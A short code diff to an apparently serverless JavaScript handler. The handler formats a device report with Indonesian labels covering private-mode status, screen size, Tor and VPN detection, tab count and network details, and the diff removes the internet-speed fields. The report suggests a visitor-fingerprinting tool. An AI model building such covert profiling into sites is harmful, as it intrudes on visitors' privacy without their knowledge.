@@ -66,8 +66,6 @@ export default async function handler(req, res) {
     const privateModeStatus = deviceInfo.isPrivateMode ? "Ya" : "Tidak";
     const screenInfo = `${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (Ratio: ${deviceInfo.pixelRatio})`;
     const uptime = deviceInfo.uptime || "Tidak diketahui";
-    const downloadSpeed = deviceInfo.downloadSpeed || "Tidak diketahui";
-    const uploadSpeed = deviceInfo.uploadSpeed || "Tidak diketahui";
     const torStatus = deviceInfo.torStatus || "Tidak terdeteksi";
     const vpnStatus = deviceInfo.vpnStatus || "Tidak terdeteksi";
     const tabCount = deviceInfo.tabCount || "Tidak diketahui";
@@ -114,7 +112,6 @@ export default async function handler(req, res) {
 
 🌐 Jaringan
 -Koneksi: ${deviceInfo.connection}
--Kecepatan Internet: ${downloadSpeed}↓ / ${uploadSpeed}↑ Mbps
 -Kondisi Jaringan: ${signalStrength}
 -Protokol Jaringan: ${networkProtocol}
 -VPN / Proxy: ${vpnStatus}
